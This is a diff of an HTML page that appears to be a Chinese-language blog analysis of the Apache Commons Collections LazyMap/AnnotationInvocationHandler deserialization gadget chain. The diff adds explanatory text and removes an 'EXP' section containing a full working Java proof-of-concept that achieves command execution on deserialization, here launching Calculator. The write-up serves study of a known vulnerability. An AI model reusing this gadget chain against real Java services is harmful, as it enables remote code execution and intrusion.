@@ -146,77 +146,37 @@
                 </a>
                 
                 <p>&nbsp;&nbsp;&nbsp;可以看到该类中还有一个get()方法调用了transform()方法。
+                	factory即为上面控制的this.factory。
                 	所以，只需要找一个调用LazyMap#get的点(有点类似找PHP的_call方法)。</p>
                 	
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-11-2/1-6.jpg" alt="">
                 </a>
                 
-                <p>&nbsp;&nbsp;&nbsp;</p>
+                <p>&nbsp;&nbsp;&nbsp;首先来到AnnotationInvocationHandler类的构造方法中，这里可以看到对this.memberValues进行了赋值。</p>
                 	
                 <a href="#">
-                    <img class="img-fluid" src="../img/2021-11-2/1-2.jpg" alt="">
+                    <img class="img-fluid" src="../img/2021-11-2/1-7.jpg" alt="">
                 </a>
                 
-                <p>&nbsp;&nbsp;&nbsp;</p>
+                <p>&nbsp;&nbsp;&nbsp;再看到该类中还有invoke方法，这里通过this.memberValues.get()调用了get方法，所以只要在构造方法中将this.memberValues赋值为LazyMap，就可以触发LazyMap#get。
+                	而这个invoke方法在动态代理LazyMap后调用，具体可以看看ysoserial中的mapProxy。完成了上面的利用链后，就需要来看一下如何通过反序列化调用。</p>
                 	
                 <a href="#">
-                    <img class="img-fluid" src="../img/2021-11-2/1-2.jpg" alt="">
+                    <img class="img-fluid" src="../img/2021-11-2/1-8.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;AnnotationInvocationHandler类继承Serializable，所以看到这里的readObject()方法。
+                	这里调用了Map类中的entrySet方法，所以进入到invoke方法拼成了上面的利用链。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-11-2/1-9.jpg" alt="">
                 </a>
                 
                 
                 
-           			<h2 class="section-heading">EXP</h2>
-           			
-           			<div>
-           				
-           				<pre class='hljs'><code><span class="hljs-literal">import</span> org.apache.commons.collections.Transformer;
-<span class="hljs-literal">import</span> org.apache.commons.collections.functors.ChainedTransformer;
-<span class="hljs-literal">import</span> org.apache.commons.collections.functors.ConstantTransformer;
-<span class="hljs-literal">import</span> org.apache.commons.collections.functors.InvokerTransformer;
-<span class="hljs-literal">import</span> org.apache.commons.collections.map.LazyMap;
-
-<span class="hljs-literal">import</span> java.io.ByteArrayInputStream;
-<span class="hljs-literal">import</span> java.io.ByteArrayOutputStream;
-<span class="hljs-literal">import</span> java.io.ObjectInputStream;
-<span class="hljs-literal">import</span> java.io.ObjectOutputStream;
-<span class="hljs-literal">import</span> java.lang.annotation.Retention;
-<span class="hljs-literal">import</span> java.lang.reflect.Constructor;
-<span class="hljs-literal">import</span> java.lang.reflect.InvocationHandler;
-<span class="hljs-literal">import</span> java.lang.reflect.Proxy;
-<span class="hljs-literal">import</span> java.util.HashMap;
-<span class="hljs-literal">import</span> java.util.<span class="hljs-built_in">Map</span>;
-
-
-public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc2</span> </span>{
-    public <span class="hljs-literal">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception {
-        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
-                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>), <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
-                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[<span class="hljs-number">0</span>]}),
-                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>}, <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]{<span class="hljs-string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>}),
-        };
-        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
-        <span class="hljs-built_in">Map</span> innerMap = <span class="hljs-keyword">new</span> HashMap();
-        <span class="hljs-built_in">Map</span> outerMap = LazyMap.decorate(innerMap, transformerChain);
-
-        Class clazz = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);
-        Constructor construct = clazz.getDeclaredConstructor(Class.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>);
-        construct.setAccessible(<span class="hljs-keyword">true</span>);
-        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.<span class="hljs-keyword">class</span>, outerMap);
-        <span class="hljs-built_in">Map</span> proxyMap = (<span class="hljs-built_in">Map</span>) Proxy.newProxyInstance(<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>}, handler);
-        handler = (InvocationHandler) construct.newInstance(Retention.<span class="hljs-keyword">class</span>, proxyMap);
-
-        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
-        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
-        oos.writeObject(handler);
-        oos.close();
-        System.out.println(barr);
-        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
-        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) ois.readObject();
-    }
-}</code></pre>
-           				
-           			</div>	
+                
+               
            
            
                 <h2 class="section-heading">There Is Nothing Below</h2>
